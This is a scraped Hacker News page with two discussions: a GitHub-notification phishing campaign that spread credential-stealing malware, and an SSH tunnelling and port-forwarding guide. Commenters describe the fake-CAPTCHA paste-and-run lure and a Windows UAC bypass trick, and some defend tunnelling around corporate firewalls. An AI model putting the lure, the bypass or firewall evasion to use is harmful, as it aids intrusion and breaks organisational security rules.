to use drivers not signed by Microsoft? reply AdieuToLogic 14 hours agorootparentprevWhat I am writing below I mean genuinely, without malice, and in the hope it helps dispel some of the conclusions you have expressed above, if not for Linux itself (which I do not normally use) then for other Unix operating systems such as FreeBSD[0]. > For starters it's security theater, given everyone and their dog prefixes sudo to all commands without much thinking. Setting aside the hyperbole, such as \"everyone and their dog prefixes sudo to all commands\" and \"most of the FOSS community at large hates users\", user/group/other permissions are one part of security in depth. Excessive use of sudo is indicative of an improperly configured system or use of software which lacks understanding of the OS which runs it. Both are causes for concern. > Windows from the start places the user at the controls with mostly no child safety locks in place ... To continue your analogy, child safety locks exist to minimize avoidable catastrophic situations for those unable to do same. > ... with that power you have to accept that if you end up hosing the system the problem is you because Windows doesn't even pretend to really protect you. At first glance, this has a \"victim blaming\" flavour to it along the lines of \"you should have known better.\" A more concerning implication is that this perspective does not take into consideration what happens when a blackhat attack is perpetrated. What benefit is \"the sheer power to hose Windows with a single Powershell line\" when it is not you whom executes it? 0 - https://docs.freebsd.org/en/books/handbook/introduction/ reply Dalewyn 11 hours agorootparentYou will have to excuse me for effectively ignoring the rest of your comment since what I'm about to point out more than makes up for the things you pointed out. >What benefit is \"the sheer power to hose Windows with a single Powershell line\" when it is not you whom executes it? The benefit is the sheer power to hose Windows with a single Powershell line. In case that doesn't make sense, let me put it this way: The benefit is the power to do whatever you want with Windows. Windows essentially will not say no to what you ask of it, you have the freedom to do with your computer as you desire with Windows. With this power, this freedom, this virtue comes responsibility. You as the user must secure the system as desired from the ground up, you have the power to do so and the responsibility. Computers are tools, Windows enabling your ability to use your computer as a tool is a virtue that is priceless especially in this day and age. If you don't believe me, consider that Windows brought forth the era of personal computing to the commons and continues to enable them by nurturing an ecosystem that can cater to almost all users' desires that now spans literally decades. reply bradjohnson 5 hours agorootparentI truly don't understand your desire to remove Linux file permissions. I also don't get why you think it's difficult to do so. There are plenty of ways for you to enable yourself to hose your machine without having to enter a password. reply darby_nine 18 hours agorootparentprev> This is a virtue. We can do whatever we want with the computer we own and use. You certainly don't need to do it with a single line of powershell though. At least, not without intentionally opting into it. For the most part on a daily basis I just want to use my computer, not modify it. Anyway, at the very least most functionality should be sandboxed so that if someone does something without your consent, it can't do much damage. Though this wasn't the original intention, leveraging user privileges and sandboxing applications by user is an effective way to do this. Besides what kind of moron would choose proprietary software if they wanted control of their machine? It's inherently a contradictory impulse. reply lyu07282 10 hours agorootparent> At least, not without intentionally opting into it. just to clarify in Windows, users with administrative privileges will in theory still ask the user to opt-in every time before any process is elevated to administrative rights. Its just that Windows security is so awful that people have found many different creative ways around it over the years, but those are (sometimes) getting patched by Microsoft so they are considered \"bugs\". For example a process stores its executable path in memory writable by itself, so you could start a process that replaces its executable string to \"C:\\Windows\\explorer.exe\" and it would (for whatever reason) bypass the \"ask for administrative rights\" dialog popup. This is the sort of \"security\" that Windows is built around to its very core. https://github.com/hfiref0x/UACME > \"This tool shows ONLY popular UAC bypass method used by malware, and re-implement some of them in a different way improving original concepts. *There are different, not yet known to the general public, methods. Be aware of this;*\" (also i think you are responding to a troll btw) reply Dalewyn 10 hours agorootparent>(also i think you are responding to a troll btw) You would be wrong. reply lyu07282 7 hours agorootparentthats exactly what a troll would say though :p reply Thomashuet 7 hours agoprevTheir claim that nothing tells you the email corresponds to the new issue is wrong, the \"(Issue #1)\" in the title means exactly that. I have actually received the same email myself and immediately recognized it as a new issue created on the repo. This user is obviously not used to GitHub issues as is made clear by the fact that this is the first issue on this repo. I guess GitHub needs to do a better job teaching new users. reply selykg 6 hours agoparentTrue, but I have worked at companies who employ users that maybe aren't entirely up to speed on the technical details and they have GitHub account's for submitting bug reports. This would very easily fool some of these people. Technical people might spot this, but that also isn't a free pass for GitHub to not do better here. reply johnklos 18 hours agoprevCan be summarized with: Don't click on links in email. So is github-scanner.com (and github-scanner.shop) still the same malicious party? It seems to be. Funny that their DNS is hosted by Cloudflare (who, famously, don't host anything, because they think we're all dumb). Cloudflare, who take responsibility for nothing, has no way to report this kind of abuse to them. The domain which hosts the malware, 2x.si, both uses Cloudflare for DNS and is hosted by Cloudflare. At least it's possible to report this to Cloudflare, even though they rate limit humans and have CAPTCHAs on their abuse reporting forms. Sigh. Thanks to Cloudflare, it's trivial these days to host phishing and malware. reply poincaredisk 16 hours agoparentCloudflare is way more responsive to abuse requests than 95% of country level DNS registrars. Having experience working with both. reply TiredOfLife 12 hours agorootparent95% more responsive than 0 is still 0. reply ipdashc 3 hours agoparentprev> Don't click on links in email. Not saying you're wrong per se, but isn't it more so summarized with \"don't fall for a 'CAPTCHA' that requires you to paste code into the window labeled 'This will run with administrative privileges'?\" This is more so a grumble than a serious comment on security, but agh, it's always bugged me that the metric for failing phishing tests is \"clicked on any link in the email\" and not, you know, entered credentials into the phish site, or downloaded and opened a file. Like, I get it, it's much easier to teach nontechnical users to simply not click bad links than that other stuff - and browser vulns do exist - but it still vaguely annoys me. I feel like I've seen countless posts like this one that end in the user entering creds, giving the browser some weird permission, downloading some file (sometimes straight-up an executable), or in this case, running a command. I don't know if I've seen a single one that ends in \"and then they clicked the link and it popped a browser 0-day and that was the end of that\". Web browsers are a wide attack surface, yes, but they're also... intended for browsing the Internet. Most people click through links pretty haphazardly as they're doing work or researching a topic. Defense in depth and all, but I feel like a security policy that holds \"don't visit any evil websites ever\" as a core tenet is pretty flawed. reply elashri 17 hours agoparentprevI don't know how effective and quick to respond but there is a way to report malware [1] Extracting from the page > Which category of abuse to select > Phishing & Malware https://www.cloudflare.com/trust-hub/reporting-abuse/ reply johnklos 17 hours agorootparentCloudflare's abuse form will not let you submit the report if you don't include a URL that currently points to their network. There're no options for phishing / scam domains for which they're the registrar and/or DNS hosting. reply ToValueFunfetti 15 hours agorootparentI haven't tested the form, but they do claim you can report abuse of the registrar with some of the options, perhaps they've changed it? Failing that: > If Cloudflare is listed as the registrar on an ICANN WHOIS listing, you also can email reports related to our registrar services to registrar-abuse@cloudflare.com reply spoonfeeder006 16 hours agoparentprevSo how do you not click links to confirm your email for a new account? Rather one could use Qubes OS and only open links in disposable VMs and never enter info beyond that Thats basically what I do when I get emails to confirm my email address for a new account One can't always avoid clicking links can they? reply bentcorner 15 hours agorootparent> So how do you not click links to confirm your email for a new account? Fair question, but the \"don't click links in email\" is for emails that you don't expect. And sure, that's an unsatisfying answer because it's hard to communicate this wisdom to your grandmother. I think the best answer is defense-in-depth. Ensure you use updated email clients, browsers, and OS, and employ a dns blocker like a pihole or equivalent public service. For less-savvy people a device like an iPad or Chromebook can be a reasonable defense. reply hunter2_ 14 hours agorootparentIf I'm being honest, \"don't click links in email unless you were expecting that particular email message\" seems easier for grandma than \"update x, y, and z, and use Pihole\" unless you want to administer her network and devices. But maybe you're saying that an iPad/Chromebook can mitigate all of the above needs? A little bit. Anyway, while I haven't heard of any cases yet, it wouldn't surprise me if senders of phishing email someday manage to deliver messages shortly after detecting some traffic (DNS lookup?) that you legitimately make with the entity the email is spoofing. Then you're expecting it, roughly. reply johnklos 3 hours agorootparentIt is a bit easier, at least. My almost 90 year old Mom now knows to be suspicious of email and to not believe email unless she has a reason to think she should be getting it. To be fair about setting up a Pihole or some other form of DNS filtering, that's something that the network administrator should do, not individual users. It's a shame that it's still not trivial - companies that make NAT routers resist building in things that they don't completely control, so a configuration page for Pihole in your NAT router's web interface likely isn't coming soon. I hope that changes. Mom also understands that someone taking over her Nextdoor account would be a nuisance, whereas someone taking over her banking account would be significantly more problematic, so the more important something is, the more time she'll take to ascertain its authenticity. I practice explaining these things because I do it often. One interesting observation is that Mom believes me, so she does the things I suggest, whereas younger people think they know better, so they generally don't put much energy in to my suggestions. I'm working on ways of showing people that they're not necessarily safe because they're \"doing the same things they've always done, and nothing bad has happened yet\". reply hunter2_ 20 minutes agorootparent> a configuration page for Pihole in your NAT router's web interface likely isn't coming soon. I hope that changes. In the meantime, the majority of routers do allow you to specify the DNS resolver instead of using whatever it learns via WAN DHCP, so you could put in a filtered public resolver (as opposed to your own Pihole instance) which gives pretty similar results if you don't need to whitelist anything. Plus, you can do the same on mobile devices that roam beyond that router (and avoid VPN through said router). I've been using dns.adguard-dns.com (94.140.14.14 and 94.140.15.15) [0]. They were founded in Moscow but now operate out of Cyprus (EU) and I don't have much of a reason to trust any other DNS operator more than them. [0] https://adguard-dns.io/en/public-dns.html -- \"method 2\" reply elashri 20 hours agoprev> The attacker quickly deletes the issue I realized I have never deleted an issue I started but doesn't people with admin access the only with ability to delete the issues on a repo? [1]. So actually there is a trace for that issue in the repository. Same thing for Pull requests. [1] https://docs.github.com/en/issues/tracking-your-work-with-is... reply 8organicbits 20 hours agoparentMaybe GitHub had already deleted it as malicious, but the email was already delivered. reply tonygiorgio 19 hours agorootparentI got this on two org repo’s yesterday. About an hour after the email, I checked and it was gone. I wanted to report it, even though GitHub scam reports are so very unsatisfying (weeks go by, then random email about how they took some action). One very simple measure I hope they implement is just not sending emails for unverified spam like this. I’d argue a majority of issues or comments do not need instant emails. Even one hour delay could help in combating abuse like this if they had any sort of reasonable moderation rules. reply latexr 18 hours agorootparent> GitHub scam reports are so very unsatisfying (weeks go by, then random email about how they took some action). Either you’re unlucky or I’m lucky, I’ve reported scammers to GitHub multiple times and always got a response in a couple of hours. reply cwizou 6 hours agorootparentSame here, I get frequent spam on one specific (very popular) issue, and they always take care of it within an hour or two. I hide the spam myself to protect the users on the web (I can't do anything about the phishing emails though that gets sent [by default I think ?]), and their moderation wipe the spam account and sends a quick email to confirm. Usually it's a new user who clones a few repositories to pass whatever mitigation they have. Always get a \"lots of reports, this may take a while\" email first though. I don't think I ever not got that one. I think there's something to be said about sending - by default - user generated content by email automatically if you've replied once to a thread. Lots of bad defaults here imho. reply elashri 17 hours agorootparentprevI reported spam comment and they acted in less than an hour. I reported the exact spam comment by another user in the same day and they took 3 months to act. It is a very random process. reply edm0nd 17 hours agoparentprevRepo owners can also edit the title and text of your Issue as well. reply ezekiel68 1 hour agoprevAn excellent slashvertisement for Virus Total. Wrapped in an important cautionary tale about how GitHub issues can be manipulated to try to spread malware. reply kyledrake 20 hours agoprevI received one of these notifications this morning and promptly ignored it. I had to laugh because it was about this repo specifically: https://github.com/kyledrake/theftcoinjs reply qwertox 20 hours agoprevIt's worth the read, he shows what they're trying to do. Easy to be suspicious with the link alone, but its fun to see someone digging into it. reply xwall 17 hours agoprevOMG! I was getting similar GitHub notification emails, saying detected vulnerability in your repo, but never figured it out as fake before this news, anyway I never clicked because I'm a lazy programmer :), once it's written it's written I do rewrite the code but don't find bugs and fix in my code. :D reply romantomjak 1 hour agoparentThe GitHub security alert digest[1] is a real thing. It's a feature of GitHub where they report security vulnerabilities in your project's dependencies. For example, if you use python and you have specified requests library in your requirements.txt, GitHub will send you emails about disclosed vulnerabilities in that library, urging you to upgrade to a higher version where it's fixed. [1] https://docs.github.com/en/code-security/dependabot/dependab... reply cebu_blue 19 hours agoprevI don't understand whats special about this particular attack!>:( When I read the title I thought some automated GitHub emails were forged to sneakily point to a fake GitHub site or something. An obvious (for tech-savvy users) link pointing to an obvious malware (please copy and execute this code to solve the captcha.) If the people you are targeting fall for this why not send an old fashioned spam email with fake headers or via some hacked Wordpress installation? I guess using GitHub notifications is creative but in the end not much different than like sending a facebook message with a fake link, and the user getting an email notification with the message? The analysis of the malware once downloaded was certainly interesting, though!:) reply jonathanlydall 10 hours agoprevJust this morning I logged a bug on a GitHub repo and within a minute someone responded with something to the effect of: Try this, I think it will fix your issue (install GCC if you need a compiler): (Bitly link redirecting to zip file on mediafire) Pass: (something) GitHub processed my abuse report within an hour and removed all posts by that user. reply rnts08 12 hours agoprevIt's quite sad that in 2024 we still have people falling for the simplest tricks. This is almost as easy as it was to call someone and asking them for the number of the modem on their desk and their logins back in the bad old days. Considering the target platform I'm not overly surprised though. reply jonny_eh 12 hours agoparentIt's quite sad that in 2024 that HN commenters still blame the victim, especially when the original author does a great job suggesting small changes that Microsoft can make to make their products safer for their users. reply slig 20 hours agoprevSeriously how hard it can be for GH to detect that a randomly just created account is creating issues, with the same text, containing a link inside? I got dozens of such spam during a whole day. reply nine_k 20 hours agoparentOnce they introduce that, the texts will become more varied, and links, possibly, too. There are more possible next steps, which would make creating accounts for spamming more expensive, but they will also inconvenience well-meaning new users. I suspect that unless the problem of malicious spam from GitHub comments becomes rather serious, acting on the case by case basis may be the correct solution. reply klabb3 14 hours agorootparent> Once they introduce that, the texts will become more varied I’ve said for some time that, while LLMs are varying levels of useful for a lot of people, it’s practically tailor made for spam and phishing. I can’t think of any “product-market-fit” as good as that. For instance: Imagine combining a leak of personal data from your favorite data broker (who knew that this would come back and bite), with an LLM to bypass spam filters and perform phishing attacks with eerie believable social engineering behind it. All for next to no money. reply halostatue 14 hours agoprevI turned off most GitHub emails and mostly use the Notification Centre for discovering things I need to know about. It's not entirely proof against phishing this way, but it doesn't get to use email to appear more legitimate. reply mfi 14 hours agoprevThis has happened for a while. In February of this year, the same attack vector was used in an attack to trick developers into thinking that they'd got a job offer from GitHub: https://www.xorlab.com/en/blog/phishing-on-github reply crvdgc 19 hours agoprevMonths ago I got crypto ads through a similar approach, some fake new account @-ing hundreds of users in an issue and then the issue is removed. The net effect is that the ads become unblockable in your email box (It's from GitHub!). Maybe devs' target value in general has growing to a point where the openness of the system is more of a vulnerability than service. reply latexr 18 hours agoprev> In text form (link altered for your safety) Might want to change the image too, macOS recognises the link in that and makes it clickable. I’d say that’s more dangerous than modifying it in the text of the post, you could just as well include a non-clickable text link. reply dabbz 15 hours agoprevI've also been seeing Typeform emails coming from spam sources. Somehow people are using Typeform's positive reputation score to send emails to arbitrary emails. reply 1f60c 11 hours agoprevNice writeup! It reminded me a bit of Julia Evans' blog in terms of content (learning by teaching). reply fforflo 18 hours agoprevWhile we're here: what happened to the GitHub explore newsletter? I really enjoyed this, but I've stopped receiving it for a few months now. And I don't think I unsubscribed. reply rwestergren 18 hours agoprevOne one hand, I can see the captcha is easy to fall for. On the other, nothing says \"prove you aren't a machine\" like \"run this code that a machine could easily run.\" reply meindnoch 10 hours agoprevNot hijacked. Faked. reply wazdra 18 hours agoprevFun how Microsoft is on both ends of the \"exploit\" reply consumerx 13 hours agoprevso many red-flags, i don't know how someone could go beyond and click this link. reply drexlspivey 20 hours agoprevIf your method of infecting your victim is having them paste and run a random command on their terminal, software developers is probably the worst group of people to be targeting. reply thephyber 19 hours agoparent“Curl pipe sh” would like to have a word… I think you are painting with a broad brush. reply vultour 18 hours agorootparentThis is no different from installing a random package through a package manager. If you're running \"curl pipe sh\" because an email told you to, that's on you. reply craftkiller 18 hours agorootparentNo it isn't. Package managers verify the cryptographically signed package. That means the package can be built on a secure server, and then if a mirror becomes malicious or gets compromised, the malicious package won't have a valid signature so the package will not be installed. Running curl and piping it into sh means that not only could a malicious mirror or compromised server execute anything they want on your computer, but they could even send a different script when you curl it into sh vs when you view it any other way, making it much harder to detect[0]. [0] https://web.archive.org/web/20240213030202/https://www.idont... reply dylan604 17 hours agorootparentI think the npm repos would like to have a word with you. Sure glad we've never had a cryptographically signed malicious package delivered via npm install reply craftkiller 16 hours agorootparentThats like not wearing a seatbelt because you can still be crushed by a truck. Don't let perfect be the enemy of good. Package managers prevent some attacks that are possible via curlsh. Some other attacks are still possible. It is still better than not cryptographically verifying the package. reply dylan604 15 hours agorootparentThat's like moving the goal posts so you can still try to have a point after the fact. Your comment suggested that package manager was secure while curlsh isn't because the package manager won't have a valid signature. That's only if the package manager was compromised. A code package that is built to be malicious will still get signed by your manager. Only now, people think they are secure because it was signed. reply bugtodiffer 11 hours agorootparentCouldn't I just publish a package? Then there's malware on the package manager wohooo reply _hyn3 15 hours agorootparentprevThe tremendous number of attacks delivered via trusted package repos versus the number of widespread attacks via curlsh (probably roughly zero) means that, theories aside, one of these is far more commonly abused than the other. reply thephyber 12 hours agorootparentprevBoth are examples of developer-types doing risky things, which was my point and also supports my point that developers are not exclusively better secured than non-developer types. reply arccy 20 hours agoparentprevyou'd be surprised at the quality of the average dev reply jeroenhd 11 hours agoparentprevHard disagree. Developers aren't magically tech wizards, many of them will struggle to install a printer. I've seen one spend fifteen minutes on adding a keyboard layout in Windows last week (granted, the process was very unintuitive). It's this \"I'm a developer, I'm too smart to fall for phishing\" mindset that makes developers an excellent target for malware. reply lukan 19 hours agoparentprevMy only encounter with this is, that I am annoyed if I open web dev tools on a new browser profile/guest profile, but am interrupted in my workflow because first I have to type \"allow pasting\" every single time. (Why I do this quite often? To be sure to have a clean state when debugging a web app) And all this, because some people cannot think, before they follow obscure instructions send to them by a untrusted party? Why can't we have nice things again? Because of abusers yes, but also because of sheep people. reply TheRealPomax 19 hours agoparentprevYou just need a handful of people to fall for it, and a population of a hundred million daily active users on GitHub means there are always a handful of people to trick. reply bickett 16 hours agoprevNo org is safe, not even Github.. reply joshdavham 18 hours agoprevThese hackers need to work on the rest of their funnel lmao. Getting me to click the link would be easy, but running that script? Never in a million years! reply AlienRobot 17 hours agoprev>verification steps >winkey+R >Ctrl+V >enter Of all things that seem legit, this seems the legitest. reply avazhi 17 hours agoprevIf you're stupid enough to paste something off a random website (that you discovered through a random email link) into the command line (and then execute it), then you deserve what happens next. At some point the end user is to blame. I also have no clue why any reasonable person would refer to that monstrosity as a CAPTCHA. reply dooer 14 hours agoprevwoah reply fijiaarone 19 hours agoprev [–] This is neither hijacking notifications nor sending malware. This is someone including a link in a message on a ticketing system open to the public, and then someone clicking on the link and downloading malware. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "Attackers are exploiting GitHub notification emails to distribute malware by creating and quickly deleting issues on public repositories.",
      "The malware, named \"LUMMASTEALER,\" steals sensitive data such as cryptocurrency wallets and stored credentials by tricking users into running a malicious PowerShell command.",
      "The attack leverages weaknesses in Windows' handling of downloaded files and code-signing certificates, and improvements in GitHub's notification emails could mitigate such threats."
    ],
    "commentSummary": [
      "GitHub notification emails have been exploited to distribute malware, raising concerns about security.",
      "Discussions emphasize the importance of recognizing red flags, such as suspicious domains and commands needing shell input, to avoid falling for scams.",
      "The conversation underscores that even experienced users can be deceived, highlighting the need for enhanced security measures on GitHub."
    ],
    "points": 424,
    "commentCount": 169,
    "retryCount": 0,
    "time": 1726780599
  },
  {
    "id": 41596818,
    "title": "Visual guide to SSH tunneling and port forwarding (2023)",
    "originLink": "https://ittavern.com/visual-guide-to-ssh-tunneling-and-port-forwarding/",
    "originBody": "To make it quick, I wish I had known about port forwarding and tunneling earlier. With this blog post, I try to understand it better myself and share some experiences and tips with you. Topics: use cases, configuration, SSH jumphosts, local/remote/dynamic port forwarding, and limitations Use cases # SSH tunneling and port forwarding can be used to forward TCP traffic over a secure SSH connection from the SSH client to the SSH server, or vice versa. TCP ports or UNIX sockets can be used, but in this post I’ll focus on TCP ports only. I won’t go into details, but the following post should show enough examples and options to find use in your day-to-day work. Security: encrypt insecure connections (FTP, other legacy protocols) access web admin panels via secure SSH tunnel (Pub Key Authentication) having potentially less ports exposed (only 22, instead of additional 80/443) Troubleshooting: bypassing firewalls/content filters choosing different routes Connection: reach server behind NAT use jumphost to reach internal servers over the internet exposing local ports to the internet There are many more use cases, but this overview should give you a sense of possibilities. Port forwarding Before we start: the options of the following examples and be combined and configured to suit your setup. As a side note: if the bind_address isn’t set, localhost will be the default Configuration / Preparation # The local and remote users must have the necessary permissions on the local and remote machines respectivly to open ports. Ports between 0-1024 require root privileges - if not configured differently - and the rest of the ports can be configured by standard users. configure clients and network firewalls accordingly SSH port forwarding must be enabled on the server: AllowTcpForwarding yes It is enabled by default, if I recall it correctly If you forward ports on interfaces other than 127.0.01, then you’ll need to enable GatewayPorts on the SSH server: GatewayPorts yes Remember to restart the ssh server service. SSH jumphost / SSH tunnel # Transparently connecting to a remote host through one or more hosts. ssh -J user@REMOTE-MACHINE:22 -p 22 user@10.99.99.1 Side note: The port addressing can be removed, if the default port 22 is used! On REMOTE-MACHINE as jumphost: [user@REMOTE-MACHINE]$ ssgrep -i ssh tcp ESTAB 0 0167.135.173.108:ssh 192.160.140.207:45960 tcp ESTAB 0 010.99.99.2:49770 10.99.99.1:ssh Explanation: 167.135.173.108 - public IP of REMOTE-MACHINE 92.160.120.207 - public IP of LOCAL-MACHINE 10.99.99.2 - internal IP of REMOTE-MACHINE 10.99.99.1 - internal IP of REMOTE-WEBAPP Using multiple jumphosts Jumphosts must be separated by commas: ssh -J user@REMOTE-MACHINE:22,user@ANOTHER-REMOTE-MACHINE:22 -p 22 user@10.99.99.1 Local Port Forwarding # Example 1 ssh -L 10.10.10.1:8001:localhost:8000 user@REMOTE-MACHINE Access logs of the webserver on REMOTE-MACHINE that only listens on 127.0.0.1: 127.0.0.1 - - [30/Dec/2022 18:05:15] \"GET / HTTP/1.1\" 200 the request originates from LOCAL-MACHINE Example 2 ssh -L 8001:10.99.99.1:8000 user@REMOTE-MACHINE Access logs of the webserver on REMOTE-WEBAPP: 10.99.99.2 - - [30/Dec/2022 21:28:42] \"GET / HTTP/1.1\" 200 the request originates from the intern IP of LOCAL-MACHINE (10.99.99.2) Remote Port Forwarding # Example 1+2 ssh -R 8000:localhost:8001 user@REMOTE-MACHINE ssh -R 8000:10.10.10.2:8001 user@REMOTE-MACHINE Example 3 ssh -R 10.99.99.2:8000:10.10.10.2:8001 user@REMOTE-MACHINE Important: GatewayPorts yes must be enabled on the SSH server to listen on another interface than the loopback interface. Dynamic port forwarding # To forward more than one port, SSH uses the SOCKS protocol. This is a transparent proxy protocol and SSH makes us of the most recent version SOCKS5. Default port for SOCKS5 server is 1080 as defined in RFC 1928. The client must be configured correctly to use a SOCKS proxy. Either on the application or OS layer. Example ssh -D 10.10.10.1:5555 user@REMOTE-MACHINE Use curl on a ‘LOCAL’ client to test the correct connection/path: curl -L -x socks5://10.10.10.1:5555 brrl.net/ip If everything works out, you should get the public IP of the REMOTE-MACHINE back SSH TUN/TAP tunneling I won’t go into detail, but you can create a bi-directional TCP tunnel with the -w flag. The interfaces must be created beforehand, and I haven’t tested it yet. -w local_tun[:remote_tun] How to run SSH in the background # The native way to run the tunnel in the background would be -fN: -f - run in the background -N - no shell ssh -fN -L 8001:127.0.0.1:8000 user@REMOTE-MACHINE Others than that: use screen or some other tools. Stop the SSH running in the background user@pleasejustwork:~$ ps -efgrep ssh [...] user 19255 1 0 11:40 ? 00:00:00 ssh -fN -L 8001:127.0.0.1:8000 user@REMOTE-MACHINE [...] Kill the process with the PID: kill 19255 Keep SSH connection alive I won’t go into detail, but there are different ways to keep the SSH connection alive. Handle timeouts with heartbeats Both options can be set on the client or server, or both. ClientAliveInterval will send a request every n seconds to keep the connection alive: ClientAliveInterval 15 ClientAliveCountMax is the number of heartbeat requests sent after not receiving an respond from the other side of the connection before terminating the connection: ClientAliveCountMax 3 3 is the default, and setting it to 0 will disable connection termination. In this example, the connection would drop after around 45 seconds without any responds. Reconnecting after termination There are mutliple ways to do it; autossh, scripts, cronjobs, and so on. This is beyond this post and I might write about in the future. Limitations # UDP SSH depends on a reliable delivery to be able to decrypt everything correctly. UDP does not offer any reliability and is therefore not supported and recommended to use over the SSH tunnel. That said, there are ways to do it as described in this post. I still need to test it. TCP-over-TCP It lowers the throughput due to more overhead and increases the latency. On connections with packet loss or high latencies (e.x. satellite) it can cause a TCP meltdown. This post is a great write-up. Nevertheless, I’d been using OpenVPN-over-TCP for a while, and it worked flawlessly. Less throughput than UDP, but reliable. So, it highly depends on your setup. Not a VPN replacement Overall, it is not a VPN replacement. SSH tunneling can be used as such, but a VPN is better suited for better performance. Potential security risk If you do not need those features, it is recommended to turn them of. Threat actors could use said features to avoid firewalls and other security measures. General links: SSH manual sshd_config manual The inspiration of this blog post are the following unix.stackexchange answer and blog post of Dirk Loss. Thanks to Frank and ruffy for valuable feedback! Most recent Articles: Dummy IP & MAC Addresses for Documentation & Sanitization Deploying ISSO Commenting System for Static Content using Docker Generate a Vanity v3 Hidden Service Onion Address with mkp224o ssh-audit Primer - Audit your SSH Server mtr - More Detailed Traceroute - Network Troubleshooting",
    "commentLink": "https://news.ycombinator.com/item?id=41596818",
    "commentBody": "Visual guide to SSH tunneling and port forwarding (2023) (ittavern.com)371 points by todsacerdoti 21 hours agohidepastfavorite54 comments lamnguyenx 17 hours agoIt's 2024! Please avoid writing SSH commands like that. Instead, configure your ~/.ssh/config with LocalForward, RemoteForward, and ProxyJump. This can save you a significant amount of time, especially when using ssh, scp, or rsync to transfer data from a remote server that requires multiple intermediate SSH connections. e.g: Host jump-host-1 HostName jump1.example.com User your_username IdentityFile ~/.ssh/id_rsa Host jump-host-2 HostName jump2.example.com User your_username IdentityFile ~/.ssh/id_rsa ProxyJump jump-host-1 Host jump-host-3 HostName jump3.example.com User your_username IdentityFile ~/.ssh/id_rsa ProxyJump jump-host-2 Host target-server HostName target.example.com User your_username IdentityFile ~/.ssh/id_rsa ProxyJump jump-host-3 LocalForward 0.0.0.0:8080 0.0.0.0:80 RemoteForward 0.0.0.0:9022 0.0.0.0:22 # after this: # - you can ssh/scp/rsync to your target-server via an alias # - forward traffic FROM port 80 on your target-server to port 8080 on your local machine # - forward ssh requests TO port 9022 on your target-server to port 22 on your local machine # - remember, for LocalForward & RemoteForward : # + left is target-server # + right is your local # + use 0.0.0.0 instead of localhost or 127.0.0.1 reply mmh0000 16 hours agoparentWhile we're sharing neat ssh_config tricks, here's my favorite trick I use: My home network is set up so that if I'm home or on my self-hosted VPN, I can SSH directly to my various things. But if I'm away from home and not on the VPN, I can SSH into my home systems through a jump host. In the ssh_config file, I have it configured to detect how/where I am and optionally use a jump host. Host jump jump.example.org HostName jump.example.org Port 41444 User mmh UserKnownHostsFile /dev/null ChallengeResponseAuthentication no CheckHostIP no Compression yes ForwardX11 no GSSAPIAuthentication no LogLevel ERROR PreferredAuthentications publickey,keyboard-interactive ProxyJump none PermitLocalCommand yes # Order here matters. Detect VPN first, then home network. # If connecting to a *.example.org host and router.example.org = 10.0.0.1, must be home/vpn. Match host *.example.org exec \"getent ahosts router.example.orggrep -q ^10.0.0.1\" ProxyJump none # If connecting to a *.example.org host and the macaddr of 10.0.0.1 is NOT 2a:70:ff:ff:ff:ff, then use jump.example.org: Match host *.example.org exec \"! arp -ne 10.0.0.1grep -Fq 2a:70:ff:ff:ff:ff\" ProxyJump jump.example.org ## Define the things Host tv tv.example.org HostName tv.example.org User mmh reply dbacar 12 hours agorootparentThis is really cool, I didnt know you could use \"exec\". reply teddyh 12 hours agorootparentprevYou should probably replace that \"arp -ne\" command with \"ip neigh show\" instead (assuming this is Linux). reply lamnguyenx 12 hours agorootparentprevWow. Nice trick! I didn't know SSH Config can do that exec control flow. reply prmoustache 10 hours agoparentprev> It's 2024! Please avoid writing SSH commands like that. Sometimes you just want to do it once and you don't want to write a config file for it. For example, I am often building up a short lived vps in order to use ssh as a socks proxy and bypass georestrictions. Also it happens that sometimes you are asked to help a different team and need to access a server you aren't accessing usually and have very few reasons to ever access again. reply cfinnberg 13 hours agoparentprevI think that using 0.0.0.0 it's a bad idea. That is supposedly opening the port in all network interfaces, including the external ones. So, if you don't have a firewall (especially on the remote server) you are exposing something to the world. OTOH if I'm going to use some tunnelling/port forwarding quite often, I would use the config file option, but for an one time or sporadic use, the command line option is better IMHO. reply lamnguyenx 12 hours agorootparentNice catch. You're right. At my company all servers operate inside a complex & heavily-guarded intranet, so I usually use 0.0.0.0 instead of localhost / 127.0.0.1. Sometimes, only using the former worked (e.g: using Code-Server or Jupyter Notebook), and I'm not so good at networking to dive into iptables and firewall things. reply EasyMark 4 hours agoparentprevBut I don’t always want the shell to happen? I whipped up some basic bash/fish functions that let me do it much easier and with minimal arguments to remember, and I can always refer to the well documented functions if I forget something. reply fracus 17 hours agoparentprevThis is interesting. I always made a bash function to proxyjump. This seems cleaner. I'll try it. reply _dan 18 hours agoprevSSH tunnelling is an utter necessity in the ridiculous corporate environment I work in. Incredible amounts of bureaucracy and sometimes weeks of waiting to get access to stuff, get ports opened, get some exception in their firewalls and vpn so someone can access a thing they need to do their job. This guide mentions -D but doesn't really articulate quite how powerful it is if you don't know what it does. ssh -D 8888 someserver, set your browser's SOCKS proxy to localhost:8888 (firefox still lets you set this without altering system defaults). Now all your browser's traffic is routed via someserver. I find that to be incredibly useful. reply globular-toast 12 hours agoparentThat was pretty much my standard way to browse the web away from home in the mid 2000s. But when I actually got a corporate job they had whitelisted IP addresses so I couldn't even get an SSH connection to some random box on the net. I was so miserable I started to look into setting up http tunnel and somehow getting a box I controlled whitelisted. But instead of going that far I just changed jobs. reply hackit2 18 hours agoparentprevIt isn't a good idea to circumvent corporate environment networks. they're there for a reason, and doing it shows a lack of professionalism and dis-respect for the organization process, procedures, and security. Yes it takes weeks/months to get access, then it takes weeks/months to get access. You don't want to be held liable for opening a backdoor to confidential information, or compromising their security. reply ziml77 14 hours agorootparentExactly. It's not a good idea to bypass policies at work. Just because you don't know why the policy is there or you disagree with the reason, it doesn't mean you can ignore the policy. If you can't get your job done, then escalate the issue to your manager. You not being able to get your work done because of other teams is the kind of problem they're supposed to be solving. reply atoav 10 hours agorootparentIf you let me ssh on that server and I am allowed to ssh from there elsewhere that is not bypassing anything. You allowed me to do that unless it says somewhere that tunnels are not allowed. The question is mainly for which purposes you allowed me to use these things and whether I comply with that. E.g. if I was given a ssh route to reach the some internal LDAP system for software development reasons and I abuse it to stream cat videos on youtube that is on me. But if I use it to reach another internal server that I use for software development, then it is on them. The alternative would be asking a babysitter for each connection you are making. Sounds like a good way to never get work done. Also: A good sysadmin will have lines in their /etc/ssh/sshd_config that prevent me from tunneling if they don't want me to do it. reply _dan 4 hours agorootparentThis is the approach I take too. If I need it and I can do it then I'm going to. If you don't want me to then block me. I must say I've had some raised eyebrows over that approach but if the alternative is not getting my shit done then 